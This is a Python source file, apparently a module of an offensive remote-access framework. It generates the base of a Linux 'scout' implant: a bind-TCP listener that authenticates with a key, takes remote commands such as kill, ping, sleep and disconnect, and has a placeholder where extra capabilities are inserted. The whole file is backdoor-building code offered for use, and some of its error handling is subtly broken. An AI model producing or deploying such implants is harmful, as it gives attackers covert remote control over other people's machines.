import library.modules.config as config
import library.modules.safe_open as safe_open

config.main()


def main(option):
    if option == 'generate':
        host = config.scout_values['Host'][0]
        port = config.scout_values['Port'][0]
        key = config.key
        timeout = config.scout_values['Timeout'][0]
        filepath = config.scout_values['Path'][0]
        config.import_statements.append('import socket')
        config.import_statements.append('from os import _exit')
        config.import_statements.append('from time import sleep')
        with safe_open.main(filepath, 'w') as f:
            if ',' in host:
                host = str(host.replace(' ', '').split(','))
                f.write('''
def recv_all(sock):
    sock.settimeout(None)
    try:
        data = sock.recv(1000000)
        processed_data = data.decode()
        target_length = int(processed_data.split("|",1)[0]) 
        data = data[len(str(target_length))+1:] 
    except UnicodeDecodeError:
        target_length = int(data.decode(encoding='utf-8', errors='ignore').split("|",1)[0])
        data = data[len(str(target_length))+1:] 
    received_data_length = len(data) 
    if received_data_length >= target_length: 
        try:
            return data.decode()
        except UnicodeDecodeError:
            return data
    sock.settimeout(3) 
    while received_data_length < target_length: 
        try:
            tmp_data = sock.recv(1000000)
            if not tmp_data:
                raise socket.error
            data += tmp_data
            received_data_length += 1000000
        except (socket.error, socket.timeout):
            break
    try:
        return data.decode()
    except UnicodeDecodeError:
        return data
def send_all(sock, data):
    try:
        sock.sendall((str(len(data)) + "|" + data).encode())
    except TypeError:
        sock.sendall(str(len(data)).encode() + b"|" + data)
host_list = variable_host
while True:
    connected = False
    while True:
        for i in host_list:
            try:
                sock = socket.socket()
                sock.settimeout(variable_timeout)
                sock.bind((i,variable_port))
                sock.listen(1)
                s, a = sock.accept()
                send_all(s,'variable_key')
                connected = True
                break
            except (socket.timeout,socket.error):
                continue
        if connected:
            break
    while True:
        try:
            data = recv_all(s)
            command = data.split(' ',1)[0]
            if command == 'kill':
                send_all(s,'[*]Scout is killing itself...')
                _exit(1)
            elif command in ('help','?'):
                send_all(s,help_menu)
            elif command == 'ping':
                send_all(s,'[+]Scout is alive')
            elif command == 'sleep':
                length = int(data.split(' ',1)[1])
                send_all(s,'[*]Scout is sleeping...')
                for i in range(length):
                    sleep(1)
                break
            elif command == 'disconnect':
                send_all(s,'[*]Scout is disconnecting itself...')
                sleep(3)
                break#Statements#
            else:
                send_all(s,'[-]Scout does not have the capability to run this command. (Was it loaded during generation?)')
        except (socket.error,socket.timeout):
            try:
                if type(e) not in (socket.error,socket.timeout):
                    raise e
                s.close()
                break
            except IndexError:
                send_all(s,'[-]Please supply valid arguments for the command you are running')
            except Exception as e:
                send_all(s,'[!]Error in scout : ' + str(e))
        except IndexError:
            send_all(s,'[-]Please supply valid arguments for the command you are running')
        except Exception as e:
            send_all(s,'[!]Error in scout : ' + str(e))
'''.replace('variable_timeout', timeout).replace('variable_host', host).replace('variable_port', port).replace(
                    'variable_key', key))
            else:
                f.write('''
def recv_all(sock):
    sock.settimeout(None)
    try:
        data = sock.recv(1000000)
        processed_data = data.decode()
        target_length = int(processed_data.split("|",1)[0]) 
        data = data[len(str(target_length))+1:] 
    except UnicodeDecodeError:
        target_length = int(data.decode(encoding='utf-8', errors='ignore').split("|",1)[0])
        data = data[len(str(target_length))+1:] 
    received_data_length = len(data) 
    if received_data_length >= target_length: 
        try:
            return data.decode()
        except UnicodeDecodeError:
            return data
    sock.settimeout(3) 
    while received_data_length < target_length: 
        try:
            tmp_data = sock.recv(1000000)
            if not tmp_data:
                raise socket.error
            data += tmp_data
            received_data_length += 1000000
        except (socket.error, socket.timeout):
            break
    try:
        return data.decode()
    except UnicodeDecodeError:
        return data
def send_all(sock, data):
    try:
        sock.sendall((str(len(data)) + "|" + data).encode())
    except TypeError:
        sock.sendall(str(len(data)).encode() + b"|" + data)
while True:
    while True:
        try:
            sock = socket.socket()
            sock.settimeout(variable_timeout)
            sock.bind(('variable_host',variable_port))
            sock.listen(1)
            s, a = sock.accept()
            send_all(s,'variable_key')
            break
        except (socket.timeout,socket.error):
            continue
    while True:
        try:
            data = recv_all(s)
            command = data.split(' ',1)[0]
            if command == 'kill':
                send_all(s,'[*]Scout is killing itself...')
                _exit(1)
            elif command in ('help','?'):
                send_all(s,help_menu)
            elif command == 'ping':
                send_all(s,'[+]Scout is alive')
            elif command == 'sleep':
                length = int(data.split(' ',1)[1])
                send_all(s,'[*]Scout is sleeping...')
                for i in range(length):
                    sleep(1)
                break
            elif command == 'disconnect':
                send_all(s,'[*]Scout is disconnecting itself...')
                sleep(3)
                break#Statements#
            else:
                send_all(s,'[-]Scout does not have the capability to run this command. (Was it loaded during generation?)')
        except (socket.error,socket.timeout) as e:
            try:
                if type(e) not in (ConnectionResetError,socket.timeout):
                    raise e
                s.close()
                break
            except IndexError:
                send_all(s,'[-]Please supply valid arguments for the command you are running')
            except Exception as e:
                send_all(s,'[!]Error in scout : ' + str(e))
        except IndexError:
            send_all(s,'[-]Please supply valid arguments for the command you are running')
        except Exception as e:
            send_all(s,'[!]Error in scout : ' + str(e))
'''.replace('variable_timeout', timeout).replace('variable_host', host).replace('variable_port', port).replace(
                    'variable_key', key))
    elif option == 'info':
        print('\nName             : Bind TCP Base component' \
              '\nOS               : Linux' \
              '\nRequired Modules : socket, time' \
              '\nCommands         : kill, ping, sleep <time>, disconnect' \
              '\nDescription      : The base component of the scout, it hosts a server and allows the user to connect to it. It also supports connection status commands' \
              '\nConnection type  : Bind\n')
